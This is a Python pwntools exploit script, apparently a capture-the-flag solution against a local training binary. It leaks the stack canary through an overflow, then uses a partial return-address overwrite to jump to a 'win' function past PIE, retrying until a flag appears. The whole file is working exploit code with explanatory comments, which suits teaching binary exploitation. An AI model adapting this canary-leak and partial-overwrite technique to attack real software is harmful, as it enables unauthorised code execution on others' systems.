from pwn import *
import time

# gambiarra do caralho pq n pensei em forma melhor de fazer e ja eh tarde.
def clean_and_return_canary_ready(canary):
    # split string 2 by 2 to isolate bytes, 
    # append a null 00 byte at the end because was replaced in the overflow,
    # reverse the order because we get the canary in reverse from memory.
    n = 2
    chunks = [canary[i:i+n] for i in range(0, len(canary), n)]
    chunks.reverse()
    chunks.append('00')
    #print(chunks)
    
    # make the splited string canary list in a string again,
    # i made this to convert the string in a int hex value
    hex_canary = int(''.join(str(item) for item in chunks), 16)
    return hex_canary
    
context.update(arch='amd64', os='linux') # set arch
#context.log_level = 'DEBUG'

while True:
    p = process('./12teaching1')

    ################################################################################
    #                       FIRST STAGE, LEAKING THE CANARY                        #
    ################################################################################
    log.info('Overflowing until the last null byte of the canary to leak the value...')
    time.sleep(1)
    # 73 is the size for the input to overwrite the last byte of the canary
    # The last byte is, as always, a null byte.
    # Without this null byte, the canary can be leaked with the printf of my input.
    p.sendline('73') 

    # REPEAT is the keyword to trigger de backdoor functionality and call vuln again.
    overflow_to_last_byte_canary = 'A'*66 + 'REPEAT' + 'A'
    p.send(overflow_to_last_byte_canary)

    # Getting the memory leaked after my input, the canary is here plus some
    # memory trash from stack.
    first_response = p.recvuntil(b'triggered')
    canary_start_position = first_response.find(b'REPEATA') + 7
    canary_final_position = first_response.find(b'\n', canary_start_position)

    # Cleaning the trash after the canary value (0:14 represents the 7 last bytes
    # of the canary).
    canary_dirty = first_response[canary_start_position:canary_final_position]
    canary_string = canary_dirty.hex()[0:14]

    #print(first_response)
    #print(canary_string)
    canary = clean_and_return_canary_ready(canary_string)

    ################################################################################
    #                       SECOND STAGE, PWWWWNINGGGGGG!!!                        #
    ################################################################################
    log.info('Canary value leaked: ' + hex(canary))
    time.sleep(1)
    log.info('Pwning now...')
    time.sleep(1)
    # 73 was to overwrite the last byte of the canary, now we want to overwrite the
    # canary, the saved frame pointer and the saved return pointer, so 73 + 7 + 8 + 8
    p.sendline('96')

    # we dont know the exact address of win, so overwriting with the last bytes 
    # of the win works because its close to the ret address and bypass PIE
    last_bytes_of_win = b'\x81' + b'\x58'
    #ret_address = b'BBBBBBBB'
    overflow_until_ret = b''
    overflow_until_ret += b'A'*72
    overflow_until_ret += p64(canary)
    overflow_until_ret += b'A'*8
    overflow_until_ret += last_bytes_of_win
    p.send(overflow_until_ret)
    
    output = p.recvrepeat(50000) # recv o carai todo
    output_splited = output.split(b'\n') # split output by newline
    
    if b'pwn_' in output: # if flag in output
        print(output_splited[-3]) # flag position
        break
    else:
        p.close()
        log.info('Flag not found retrying...')

#p.interactive()
    
    
